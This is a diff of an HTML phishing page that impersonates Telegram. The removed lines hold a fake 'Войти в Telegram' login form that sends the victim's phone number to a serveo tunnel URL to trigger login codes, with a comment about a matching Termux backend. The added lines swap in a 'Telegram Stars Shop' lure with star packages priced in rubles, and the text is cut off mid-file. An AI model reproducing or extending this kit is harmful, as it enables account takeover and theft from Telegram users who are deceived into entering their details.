@@ -3,33 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Login</title>
+    <title>Telegram Stars Shop</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #0f172a; color: white; }
+        .hidden { display: none; }
+    </style>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen">
-    <div class="bg-white p-8 rounded-lg shadow-md w-full max-w-sm text-center">
-        <h2 class="text-xl font-bold mb-4">Войти в Telegram</h2>
-        <input type="text" id="phone" placeholder="+7 900 000-00-00" class="w-full p-3 border rounded mb-4">
-        <button onclick="sendData()" class="w-full bg-blue-500 text-white py-3 rounded font-bold">ДАЛЕЕ</button>
-    </div>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <div class="bg-slate-800 rounded-2xl shadow-2xl w-full max-w-md p-6 text-center border border-slate-700">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="w-20 h-20 mx-auto mb-4">
+        <h1 class="text-2xl font-bold mb-2 text-blue-400">Магазин Звезд</h1>
+        <p class="text-slate-400 mb-6 text-sm" id="status-text">Выберите пакет звезд для вашего аккаунта</p>
 
-    <script>
-        // ВАЖНО: Проверь, что эта ссылка совпадает с Окном №2 в Termux!
-        const API_URL = "https://db29717b97dd93df61249db4296703ad.serveousercontent.com/api/login";
-
-        async function sendData() {
-            const phone = document.getElementById('phone').value;
-            try {
-                await fetch(API_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ action: "send_code", phone: phone })
-                });
-                alert("Данные отправлены! Проверь Termux и Telegram.");
-            } catch (e) {
-                alert("Ошибка! Проверь туннель в Termux.");
-            }
-        }
-    </script>
-</body>
-</html>
+        <div id="step-stars">
+            <div class="grid grid-cols-2 gap-3 mb-6">
+                <div class="bg-slate-700 p-3 rounded-xl border border-slate-600 hover:border-blue-500 cursor-pointer">
+                    <p class="font-bold">⭐ 100</p>
+                    <p class="text-xs text-slate-400">249₽</p>
+                </div>
+                <div class="bg-slate-700 p-3 rounded-xl border border-slate-600 hover:border-blue-500 cursor-pointer">
+                    <p class="font-bold">⭐ 500</p>
+                    <p class="text-xs text-slate-400">990₽</p>
